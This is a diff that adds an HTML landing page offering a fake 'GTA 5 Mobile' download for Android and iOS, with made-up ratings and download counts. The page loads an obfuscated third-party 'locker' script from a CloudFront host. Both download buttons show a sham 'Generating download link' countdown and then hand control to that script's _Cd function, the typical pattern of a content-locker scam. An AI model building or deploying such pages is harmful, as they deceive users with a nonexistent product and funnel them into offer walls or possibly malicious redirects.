@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download GTA 5 Mobile - APKLingo</title>
+    
+    <!-- SEO Meta Tags -->
+    <meta name="description" content="Download the latest version of GTA 5 for Android and iOS. Experience the full open-world of Los Santos on your mobile device.">
+    <meta name="keywords" content="GTA 5 mobile, download GTA 5, GTA 5 Android, GTA 5 iOS, Grand Theft Auto V mobile">
+    <meta name="author" content="eGame Fun">
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+    <!-- GTA 5 Specific Locker Script -->
+    <script type="text/javascript">
+        var jqYKs_RaT_FBUmWc={"it":4541291,"key":"759e0"};
+    </script>
+    <script src="https://dfmpe7igjx4jo.cloudfront.net/2ad30b0.js"></script>
+
+    <style>
+        html { scroll-behavior: smooth; }
+        body { 
+            font-family: 'Poppins', sans-serif; 
+            background-color: #111827;
+            color: #E0E0E0;
+        }
+        .gradient-text { background: linear-gradient(90deg, #10b981, #6ee7b7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        
+        /* Animation Keyframes */
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes progress-animation { from { width: 0%; } to { width: 100%; } }
+
+        /* Animation Classes */
+        .animate-fadeInUp { animation: fadeInUp 0.7s ease-out forwards; }
+        
+        /* Countdown Timer Styles */
+        .countdown-container { text-align: center; padding: 1rem 0; }
+        .countdown-text { font-size: 1rem; color: #a0aec0; margin-bottom: 0.75rem; }
+        .progress-wrapper { background-color: #2d3748; border-radius: 9999px; height: 10px; width: 100%; overflow: hidden; }
+        .progress-bar { background: linear-gradient(90deg, #10b981, #6ee7b7); height: 100%; animation: progress-animation 3s linear forwards; }
+    </style>
+</head>
+<body class="bg-gray-900 text-gray-200">
+
+    <!-- Main Content -->
+    <main class="container mx-auto px-4 py-12 flex items-center justify-center min-h-screen">
+        <div class="w-full max-w-2xl bg-gray-800 border border-gray-700 rounded-2xl shadow-2xl p-8 opacity-0 animate-fadeInUp">
+            
+            <!-- Game Header -->
+            <div class="flex flex-col sm:flex-row items-center sm:items-start text-center sm:text-left space-y-4 sm:space-y-0 sm:space-x-6 mb-6">
+                <img src="https://www2.0zz0.com/2025/04/20/14/782745281.png" alt="GTA 5 Mobile" class="w-32 h-32 rounded-2xl object-cover flex-shrink-0 border-2 border-gray-700">
+                <div>
+                    <h1 class="text-4xl font-bold gradient-text">GTA 5 Mobile</h1>
+                    <p class="text-gray-400 mt-1">The complete Los Santos experience in your pocket.</p>
+                </div>
+            </div>
+
+            <!-- Game Stats -->
+            <div class="flex items-center justify-center sm:justify-start flex-wrap text-sm my-6 text-gray-300 bg-gray-900 p-3 rounded-lg">
+                <span class="flex items-center mr-4 mb-2 sm:mb-0 font-semibold"><i class="fas fa-star text-yellow-400 mr-1.5"></i> 4.6 Rating</span>
+                <span class="flex items-center mr-4 mb-2 sm:mb-0 font-semibold"><i class="fas fa-download text-green-400 mr-1.5"></i> 10K+ Downloads</span>
+                <span class="flex items-center font-semibold"><i class="fas fa-fire text-red-500 mr-1.5"></i> 1.5K Active</span>
+            </div>
+
+            <!-- Game Description -->
+            <p class="text-gray-300 mb-6">
+                Grand Theft Auto V for mobile brings the sprawling city of Los Santos to your fingertips. Experience the interwoven stories of Michael, Franklin, and Trevor in this critically acclaimed open-world adventure. Explore the stunning world, complete missions, and cause mayhem on the go.
+            </p>
+
+            <!-- Download Section -->
+            <div id="download-section" class="mt-6 grid grid-cols-1 sm:grid-cols-2 gap-4">
+                <button onclick="startDownloadProcess()" class="w-full flex items-center justify-center bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded-lg transition-transform transform hover:scale-105">
+                    <i class="fab fa-android mr-2"></i> Download for Android
+                </button>
+                <button onclick="startDownloadProcess()" class="w-full flex items-center justify-center bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 rounded-lg transition-transform transform hover:scale-105">
+                    <i class="fab fa-apple mr-2"></i> Download for iOS
+                </button>
+            </div>
+            
+        </div>
+    </main>
+
+    <script>
+        function startDownloadProcess() {
+            const downloadSection = document.getElementById('download-section');
+            if (!downloadSection) return;
+            let countdown = 3;
+            downloadSection.innerHTML = `
+                <div class="countdown-container col-span-full">
+                    <p id="countdown-text" class="countdown-text text-gray-400">Generating download link... ${countdown}</p>
+                    <div class="progress-wrapper bg-gray-700 rounded-full">
+                        <div class="progress-bar"></div>
+                    </div>
+                </div>
+            `;
+            const countdownText = document.getElementById('countdown-text');
+            const interval = setInterval(() => {
+                countdown--;
+                countdownText.textContent = `Generating download link... ${countdown}`;
+                if (countdown <= 0) {
+                    clearInterval(interval);
+                    countdownText.textContent = "Redirecting...";
+                    // The locker script should define a global _Cd function.
+                    if (typeof _Cd === 'function') {
+                        _Cd();
+                    } else {
+                        console.error("Locker function (_Cd) not found.");
+                    }
+                }
+            }, 1000);
+        }
+
+        // --- INITIAL RENDER ---
+        document.addEventListener('DOMContentLoaded', () => {
+            document.querySelectorAll('.animate-fadeInUp').forEach(el => el.style.opacity = '1');
+        });
+    </script>
+</body>
+</html>
